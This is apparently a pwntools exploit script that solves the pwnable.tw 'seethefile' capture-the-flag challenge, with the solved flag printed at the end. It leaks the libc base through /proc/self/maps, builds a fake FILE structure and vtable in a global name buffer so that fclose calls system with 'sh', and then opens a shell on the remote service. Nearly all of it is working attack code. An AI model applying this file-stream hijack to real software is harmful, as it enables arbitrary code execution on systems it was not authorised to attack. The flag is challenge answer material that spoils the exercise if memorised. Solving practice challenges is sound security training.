from pwn import *
debug = 0
if debug:
	s = process('./seethefile')
	raw_input('debug')
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
else:
	s = remote('chall.pwnable.tw', 10200)
	libc = ELF('libc_32.so.6')
	system_offset = libc.symbols['system']
	binsh_offset = libc.search('/bin/sh').next()
	
def openfile(filename):
	s.sendlineafter('Your choice :','1')
	s.sendlineafter('What do you want to see :',filename)

def readfile():
	s.sendlineafter('Your choice :','2')
	
def writefile():
	s.sendlineafter('Your choice :','3')

def closefile():
	s.sendlineafter('Your choice :','4')
	
def exit(name):
	s.sendlineafter('Your choice :','5')
	s.sendlineafter('Leave your name :',name)

#leak libc 
openfile('/proc/self/maps')
readfile()
readfile()
writefile()
libc_addr = s.recvuntil("r-xp")
libc_base = int(libc_addr.split('-')[-3].split('\n')[1], 16)
log.info("libc_base: 0x%x"%libc_base)
# calc address

system_libc = libc_base+system_offset

# exploit

name = 0x804B260
payload = '\x85\x85;sh;sh,'.ljust(0x20,'\0')
payload += p32(name)
payload = payload.ljust(0x46,'c')
payload += p32(0x0)
payload = payload.ljust(0x94,'c')
payload += p32(name+0x94-4) 
payload += p32(system_libc)
# buffer = 0x804b260 # name's address 
# pay = '/bin/sh'.ljust(0x20, '\0')
# pay += p32(buffer)
# pay = pay.ljust(0x48, '\0')
# pay += p32(buffer + 0x10) # make lock point to '\x00'
# pay = pay.ljust(0x94, '\0')
# pay += p32(0x804b2f8 - 0x44) # vtable address,0x44 is fclose's offset 
# pay += p32(system_libc) # 0x804b260+0x94 + 4 =0x804b2f8 
exit(payload)

s.sendline('cd home/seethefile')
s.sendline('./get_flag')
s.sendlineafter('Your magic :','Give me the flag')
s.interactive()
s.close()
# FLAG{F1l3_Str34m_is_4w3s0m3}